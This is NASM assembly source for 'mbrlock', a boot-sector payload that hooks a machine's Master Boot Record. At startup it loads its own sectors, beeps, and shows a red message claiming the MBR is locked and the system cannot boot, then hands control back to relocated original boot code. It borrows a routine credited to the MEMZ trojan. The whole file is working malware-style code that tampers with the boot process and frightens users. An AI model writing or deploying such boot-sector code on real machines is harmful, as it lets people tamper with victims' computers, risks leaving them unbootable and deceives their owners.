; MBR bootloader code for mbrlock
; (https://github.com/bitwaree/mbrlock)
; Copyright (c) 2024 bitware.


; ####################################################################################
; #                                                                                  # 
; ;--------------------------------[MACRO Definations]-------------------------------;
; #   no mapped address.. !                                                          #
; ####################################################################################



; TYPE: NASM MACRO
;loads a sector at the specified address
;Usage:
;loadsector <address>, <sector_num>, <sector_count>

; ------- DEF start -------
%macro loadsector 3
	; Load the next stage (assume it's in the next sector)
    ;mov bx, 0x7C00      ; Load address for the next stage
    mov ah, 0x02       ; BIOS function to read sectors
    mov al, %3         ; Number of sectors to read
    mov ch, 0          ; Cylinder
    mov cl, %2         ; Sector number ('n'th sector)
    mov dh, 0          ; Head
    mov bx, %1         ; Load to address (eg. 0x7C00)
    int 0x13           ; Call BIOS to read sector
	
%endmacro
; ------- DEF end -------




; TYPE: NASM MACRO
; Switch to text mode and clean the screen
;Usage:
;    textmode_clear

; ------- DEF start -------
%macro textmode_clear 0
    mov ax, 0x0003     ; Function 03h: Set video mode (text mode 80x25)
    int 0x10           ; Call BIOS video interrupt
%endmacro
; ------- DEF end -------





; TYPE: NASM MACRO
; Switch to video mode and clean the screen
;Usage:
;    videomode_clear

; ------- DEF start -------
%macro videomode_clear 0
    mov ax, 0x13       ; Video mode (320x200)
    int 0x10           ; clear screen
%endmacro
; ------- DEF start -------




; TYPE: NASM MACRO
;prints a charcater (char, color)
;Usage:
;    printc <char>, <color>

; ------- DEF start -------
%macro printc 2
	push bx
	mov ah, 0x0e
	mov al, %1;		Character to print
	mov bx, %2;		Color of the cheracter
	int 0x10

	pop bx
%endmacro
; ------- DEF end -------



;TYPE: NASM MACRO
;sleeps a few second (copied from MEMZ)
;Usage:
;    sleep <i>, <j>

; ------- DEF start -------
%macro sleep 2
	; Use BIOS interrupt to sleep
	push dx
	mov ah, 86h
	mov cx, %1
	mov dx, %2
	int 15h
        pop dx
%endmacro
; ------- DEF end -------




; ####################################################################################
; #                                                                                  # 
; ;--------------------------------[Start of Assembly]-------------------------------;
; # file offset: 0x0000                                     0x7c00 :physical address #
; ####################################################################################



[org 0x7c00]            ; Start of the boot sector, it's loaded at 0x7c00 in memory

init:

	sti                 ; Activate interrupts

bootstrap:
	;load 8th (and onwards) sectors at physical address: 0x7c00 + (0x200 * 7) = 0x8a00
    loadsector 0x8a00, 8, 3
	jmp mbrlocker       ; Hook/intercept to mbrlocker code
	
	times 0x13-($-$$) db 0x90   ; nops
bootstrap_end:
	
; *****************************************************
; $                                                   $
; ;---------[Leftover assembly code of MBR]-----------;
; $                                                   $
; $  The bytes will be re-executed once the hook      $
; $  returns, **the bytes is originally noped** but   $
; $  should be overwritten when the hooked code       $
; $  returns.                                         $
; $                                                   $
; *****************************************************
	
times 446-($-$$) db 0x90 ; nop till partition table data
	
	
times 510-($-$$) db 0    ; zero bytes till boot sign
dw 0xaa55                ; boot signature

; ---------(end of MBR)----------

times 3584-($-$$) db 0  ; nop till sector 8


; *****************************************************
; $                                                   $
; ;---------[Start of 8th sector, MBRlocker]----------;
; $                                                   $
; $ The MBRlocker code lives at offset 0xe00 (start   $
; $ of 8th sector), it's mapped at physical address   $
; $ 0x8a00!                                           $
; $                                                   $
; $ Sector 8 ends with a jmp instruction to offset    $
; $ 0x13 or physical address 0x7c13 where the left    $
; $ -over MBR assembly code lives.                    $
; $                                                   $
; $  0x0e00                                   0x8a00  $
; *****************************************************
	



;start of sector 8
mbrlocker:

	; init code
	cli					; Disable Interrupts
	xor ax, ax          ; Initialization of registers
	;init segment register
	mov ds, ax
	mov es, ax
	mov ss, ax
	
	mov sp, 0x7c00      ; Setup StackPointer
	mov bp, sp          ; Setup BasePointer
	sti 				; Re-Enable Interrupts
	
	;mbrlocker code
    textmode_clear      ; clear screen
	mov si, bannerstr   ; print banner text
	call print_str
	
	call initspk        ; initialize speaker
	call beepon         ; do a beep
	
	sleep 0xf, 0xfff0   ; wait a bit
	
	call beepoff        ; stop the beeping sound

    
	; messeage print on bright red color
	videomode_clear     ; switch to 320x200 video mode
	                    ;+clear the screen
						
	xor bx, bx	;reset bx register
	mov dx, bx	;reset dx register as well
	;bx and dx equals 0
	add bx, msg	;acts like a (char *)

printmsg:

	;mov bx, dx
	;add bx, msg

	cmp byte [bx], 0
	je msgprint_done	;Jmp to hlt if the string is terminated with NULL byte

	printc byte [bx], 0xC	;Print char byte
	add bx, 1
	jmp printmsg

msgprint_done:
	sleep 0x10, 0xffff  ; wait a bit
	
	call beepon         ; do a beep
	sleep 0x1, 0xffff   ; wait a bit
	call beepoff
	
	textmode_clear      ; switch back to text mode


; *****************************************************
; $                                                   $
; ;--------------[Overwritten MBR code]---------------;
; $                                                   $
; $  The bootstrap code (0x0000-0x12) contains 13byte $
; $  when implimenting the bytes are overwritten and  $
; $  the bytes should be placed here so that they get $
; $  executed properly before the control flow jumps  $
; $  back to 0x13(offset) or 0x7c13(physical).        $
; $                                                   $
; *****************************************************


;-----excess mbr code------
    times 0xFFD-($-$$) db 0x90   ; nops till 3 bytes before 9th sector    
;-----excess code end-----

	jmp bootstrap_end   ; jump back to leftover MBR code



; ####################################################################################
; #                                                                                  # 
; ;--------------------[Functions and constant definations]--------------------------;
; # file offset: 0x1000                                     0x8c00 :physical address #
; ####################################################################################

; 9th sector
;------------Constant Data definations------------;


bannerstr:
    db 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A
    ;db '            _/      _/  _/_/_/    _/_/_/    _/                      _/          '
    ;db '           _/_/  _/_/  _/    _/  _/    _/  _/    _/_/      _/_/_/  _/  _/       '
    ;db '          _/  _/  _/  _/_/_/    _/_/_/    _/  _/    _/  _/        _/_/          '
    ;db '         _/      _/  _/    _/  _/    _/  _/  _/    _/  _/        _/  _/         '
    ;db '        _/      _/  _/_/_/    _/    _/  _/    _/_/      _/_/_/  _/    _/        '
    ;db 0
	
    ;db '                          __  ______  ___  __         __                        '
    ;db '                         /  |/  / _ )/ _ \/ /__  ____/ /__                      '
    ;db '                        / /|_/ / _  / , _/ / _ \/ __/  `_/                      '
    ;db '                       /_/  /_/____/_/|_/_/\___/\__/_/\_\                       '
	;db '                                                ----by bitware                  '
	;db 0
	
    db '|               #     # ######  ######                                         |'
    db '|               ##   ## #     # #     # #       ####   ####  #    #            |'
    db '|               # # # # #     # #     # #      #    # #    # #   #             |'
    db '|               #  #  # ######  ######  #      #    # #      ####              |'
    db '|               #     # #     # #   #   #      #    # #      #  #              |'
    db '|               #     # #     # #    #  #      #    # #    # #   #             |'
    db '|               #     # ######  #     # ######  ####   ####  #    #            |'
    db '|                                                           --by bitware       |'
    db 0

msg: db 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A
	db "           MBR is locked !   :\         ", "You can't boot into your system now.    ", 0x0A
	db "                      --bitware.        ",0

;------------Function Snippets------------;


;TYPE: FUNCTION
;prints a string
;Usage:
;    mov si, <ptr>
;    call print_str

; ------- FUNC start -------
print_str:

    mov ah, 0x0e ; int 10h teletype function

; print loop
print_loop:

    lodsb
    cmp al, 0
    je print_done
    int 0x10
    jmp print_loop

print_done:
        ret

; ------- FUNC END -------





;TYPE: FUNCTION
;Initialize pc speaker for beeps
;Usage:
;    call initspk
; ------- FUNC start -------
initspk:

	; Init PC speaker
	mov al, 182
	out 43h, al
	
	ret
; ------- FUNC start -------



;TYPE: FUNCTION
;Does a beep
;Usage:
;    call beepon

; ------- FUNC start -------
beepon:

    ; Set the frequency for the beep
    mov dx, 0x61     ; Port for the PC speaker
    in al, dx        ; Read current state
    or al, 3        ; Set bits 0 and 1 to enable the speaker
    out dx, al      ; Write back to the port

    ; Set the frequency for the beep (around 800 Hz)
    mov dx, 0x43     ; Control word port
    mov al, 0xB6     ; Set mode: square wave, binary, channel 2
    out dx, al       ; Send control word

    ; Set the frequency divisor for 800 Hz
    mov dx, 0x42     ; Channel 2 data port
    mov ax, 1193180 / 800 ; 800 Hz frequency
    out dx, al       ; Send low byte
    mov al, ah
    out dx, al       ; Send high byte
	
	ret
; ------- FUNC start -------


;TYPE: FUNCTION
;Ends a beep
;Usage:
;    call beepoff

; ------- FUNC start -------
beepoff:

	; Stop the beep
    mov dx, 0x61
    in al, dx
    and al, 0xFC     ; Clear bits 0 and 1 to disable the speaker
    out dx, al

	ret
; ------- FUNC start -------
